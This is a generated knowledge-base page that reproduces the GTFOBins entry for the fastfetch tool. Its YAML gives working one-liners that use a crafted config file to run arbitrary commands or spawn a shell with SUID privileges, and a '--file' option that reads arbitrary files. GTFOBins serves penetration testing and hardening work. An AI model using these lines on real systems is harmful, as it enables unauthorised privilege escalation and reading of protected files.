---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# fastfetch

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `fastfetch` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/fastfetch` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [fastfetch](../../tools/linux/fastfetch.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | fastfetch |
| name | fastfetch |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/fastfetch/ |

## Preserved Source Material

```yaml
_body: ''
_name: fastfetch
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/fastfetch
functions:
  command:
  - code: 'echo ''{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}'' >/path/to/temp-file.jsonc

      fastfetch -c /path/to/temp-file.jsonc'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  file-read:
  - binary: false
    code: fastfetch --file /path/to/input-file
    comment: The file content is used as the logo while some other information is displayed on its right.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: 'echo ''{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}'' >/path/to/temp-file.jsonc

      fastfetch -c /path/to/temp-file.jsonc'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
